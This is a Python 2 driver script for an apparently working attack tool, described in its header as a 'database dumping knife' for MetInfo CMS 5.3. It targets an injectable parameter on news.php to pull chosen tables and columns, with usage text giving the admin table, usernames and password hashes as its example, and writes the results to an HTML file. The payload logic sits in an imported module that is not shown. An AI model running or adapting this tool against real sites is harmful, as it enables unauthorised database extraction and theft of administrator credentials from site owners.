# # coding:utf-8
'''
Created on 20160525
metinfo企业管理系统5.3脱裤小刀
@author: W.sy
'''
import sys,getopt
import downloader,outputer


class SpiderMain(object):
    
    def __init__(self):
        self.downloader = downloader.Downloader()
        self.outputer = outputer.Outputer()
    
    
    # 主调度函数    
    def craw(self, base_url,tablename,columns):
        try:
            # 下载判断获取
            html_datas = self.downloader.get_html(base_url,tablename,columns)
            # 输出
            self.outputer.output_to_html(html_datas,columns)
        except:
            print "failed!"

    def usage(self):
        print "-h  find help \n-w  set target ip \n-s  set tablename \n-y  set columns \nYou can find all columns about metinfo by baidu"
        print "egg : metinfoSpider.py -w 192.168.1.244 -s met_admin_table -y id,admin_id,admin_pass "
        print "output file is d:\\metinfotable.html"
        


if __name__ == '__main__':
    obj_spider = SpiderMain()
    ip = ""
    tablename = ""
    columns = ""
    #"hi:o:":当一个选项只是表示开关状态时，即后面不带附加参数时，在分析串中写入选项字符。当选项后面是带一个附加参数时，在分析串中写入选项字符同时后面加一个":"号。所以"hi:o:"就表示"h"是一个开关选项；"i:"和"o:"则表示后面应该带一个参数。
    
    opts, args = getopt.getopt(sys.argv[1:], "hw:s:y:")    
    for op, value in opts:
        if op == "-w":
            ip = value
        elif op == "-s":
            tablename = value
        elif op == "-y":
            columns = value
        elif op == "-h":
            obj_spider.usage()
        else:
            obj_spider.usage()
    if ip == "" or tablename == "" or columns == "":
        print "Please input right option  -h  See help"
        exit
##########   测试数据，使用请注掉      ##########
#     ip = "192.168.1.244"
#     tablename = "met_admin_table"
#     columns = "id,admin_id,admin_pass"
##########   测试数据，使用请注掉      ##########
    print "Program has a little slow,please take a smoke or take a cup of water!"
    base_url = "http://"+ip+"/news/news.php?lang=cn&class2=5&imgproduct=xxxx"
    obj_spider.craw(base_url,tablename,columns)
    sys.exit()
    